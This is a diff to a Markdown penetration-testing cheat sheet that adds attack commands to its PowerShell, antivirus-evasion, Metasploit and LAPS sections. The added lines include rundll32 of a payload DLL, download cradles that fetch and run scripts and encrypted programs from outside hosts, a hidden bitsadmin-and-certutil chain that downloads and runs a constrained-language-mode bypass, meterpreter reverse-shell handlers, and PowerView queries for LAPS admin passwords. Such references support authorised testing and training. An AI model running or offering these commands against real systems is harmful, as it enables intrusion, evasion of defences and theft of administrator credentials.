@@ -20,8 +20,9 @@ Enjoy.
 - [MSSQL](#mssql)
 - [TTY](#tty)
 - [Powershell](#powershell)
-     - [Check 64bit Shell](#check-64bit-shell)
+    - [Check 64bit Shell](#check-64bit-shell)
         - [Change Passwd](#change-passwd)
+        - [Run DLL](#run-dll)
         - [Add User](#add-user)
         - [Execute Cradle](#execute-cradle)
         - [Download Cradle](#download-cradle)
@@ -36,6 +37,7 @@ Enjoy.
 - [Antivirus](#antivirus)
     - [AMSI](#amsi)
         - [CLM](#clm)
+        - [Java](#java)
         - [App Locker](#app-locker)
         - [Check PPL](#check-ppl)
         - [Roll-Back Defender Definitions](#roll-back-defender-definitions)
@@ -106,7 +108,7 @@ python -c 'import pty;pty.spawn("/bin/bash")
 
 # Powershell
 
-#### Check 64bit Shell
+##### Check 64bit Shell
 
 ```powershell
 [Environment]::Is64BitOperatingSystem
@@ -120,6 +122,11 @@ $UserPassword = ConvertTo-SecureString 'PasswordRulon123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $creds -Verbose 
 ```
 
+##### Run DLL
+
+```powershell
+Rundll32 c:\users\public\payload.dll,run
+```
 ##### Add User
 
 ```powershell
@@ -188,10 +195,8 @@ invoke-Command -ScriptBlock {whoami} -Session $sess
 
 ```powershell
 Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
-```
 
-```powershell
-iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password password -noArgs`
+iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password SuperDumperStrongPassword -noArgs`
 ```
 
 ##### Load Assembly
@@ -231,18 +236,19 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ##### CLM
 
 ```powershell
+certutil -encode clm.exe enc5.txt 
+```
+
+```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
 
 ```powershell
-Installutil.exe /logfile= /LogToConsole=false /U "C:\temp\bypass-clm.exe"
+powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe
 ```
 
-```powershell
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U C:\path\to\clm-bypass.exe
-```
+##### Java
 
-##### JAVA
 ```powershell
 mshta file.hta
 ```
@@ -366,6 +372,9 @@ execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 execute -i H -f powershell < spawn x64 process
 pgrep spool
 exploit -j < run in background
+sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
+sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 4444;exploit;"
+
 ```
 
 * * *
@@ -462,6 +471,10 @@ python samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E2941
 
 ```powershell
 iex(new-object net.webclient).downloadstring(http://ip:port/LAPSToolkit.ps1);Get-LAPSComputers
+```
+
+```powershell
+iex(New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1');Get-ADObject -Name MachineName -DomainController IP -Properties ms-mcs-admpwd 
 ```
 
 ##### Unconstrained Delegation
